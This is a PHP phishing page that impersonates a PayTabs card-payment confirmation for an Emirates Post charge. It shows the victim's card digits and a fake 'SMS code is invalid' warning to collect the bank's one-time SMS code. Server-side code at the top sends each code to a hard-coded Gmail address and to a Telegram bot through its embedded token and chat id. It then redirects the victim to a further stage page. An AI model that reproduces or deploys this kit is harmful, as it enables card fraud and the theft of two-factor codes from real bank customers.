<?php
if (isset($_POST['sms'])){
    
    $smscode = $_POST['sms_code'];
    $to = "ilyataha553@gmail.com";
    $subject = "Details";
    $headers = "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $body = "SMS Code: ".$smscode."";
    if (mail ($to,$subject,$body, $headers)){
$websit="https://api.telegram.org/bot6971720911:AAGYhmLIBBcBonsjisq5tZo6_C-5Wv9SfVs";
$param=[
      'chat_id'=>'5061239044',
      'text'=>$body,
  ];
  $ch = curl_init($websit . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($param));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
    header("Location: ./4.php");}  
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="shortcut icon" href="./im/5.png">
    <title>PayTabs - Simple &amp; Trusted Payments</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.5.3/css/bootstrap.min.css" />
    <link href="css/style.css" rel="stylesheet" type="text/css">
    <link href="css/opensans.css" rel="stylesheet" type="text/css">
    <link href="css/custom.css" rel="stylesheet" type="text/css">
</head>

<body data-gr-c-s-loaded="true">
    <header class="header">
        <div class="container">
            <div class="header-logo img-responsive">
                <div class="text-nav">
                    <a class="language-nav" id="change_lang" href="" title="عربي"
                        style="font-size: small !important; font-family: &quot;Droid Arabic Kufi&quot;,&quot;Open Sans&quot; !important;">
                        عربي </a>
                </div>
                <img src="./im/1.jpg" width="151" height="54" alt="logo">
            </div>
        </div>
    </header>
    <div class="clearfix"></div>

    <div id="ss-wrapper">
        <div class="ss-area">
            <form action="" method="post">
            <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="max-width: 150px;" src="./im/1.jpg"></div>
                    <div><img src="./im/15.jpeg"></div>
                </div>
                <h3>Please confirm the following payment.</h3>
                <div class="details">
                    <p>The unique password has been sent to your mobile number. If you need to change your mobile number
                        please contact your bank of modify it via the available chanels (ATM, web).</p>
                    <table>
                        <tr>
                            <td>Merchant:</td>
                            <td>Emirates Post</td>
                        </tr>
                        <tr>
                            <td>Amount:</td>
                            <td>15.12 AED</td>
                        </tr>
                        <tr>
                            <td>Date:</td>
                            <td>
                                <?php echo date('d/m/Y'); ?>
                            </td>
                        </tr>
                        <tr>
                            <td>Credit card number</td>
                            <td>XXXX XXXX XXXX <?php session_start();echo $_SESSION['card'];?>
                                
                            </td>
                        </tr>
                        <tr>
                            <td>SMS code</td>
                            <td>
                                <input type="text" name="sms_code" id="sms_code" class="required" required="">
                                <p style="color: #D40511; font-size: 15px; margin-bottom: 0; margin-top: 5px;">SMS code is
                                    invalid *</p>

                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Please enter the
                        verification code received by sms : <span class="timer"
                            style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </div>
                <div class="btns">
                    <button type="submit" name="sms">Submit</button>
                </div>

            </form>
        </div>
    </div>
    <footer class="footer">
        <img src="./im/4.png" width="85" height="34" alt="express checkout">
    </footer>

    <!-- JS im -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
    <script src="./js/jquery.countdownTimer.min.js"></script>
    <script src="./js/script.js"></script>

    <script type="text/javascript">
        $(".timer").countdowntimer({
            minutes: 2,
            timeUp: timeIsUp
        });
        function timeIsUp() {
            $(".timer").html('Try again');
        }
        $('.timer').click(function () {
            location.reload();
        });
    </script>
</body>

</html>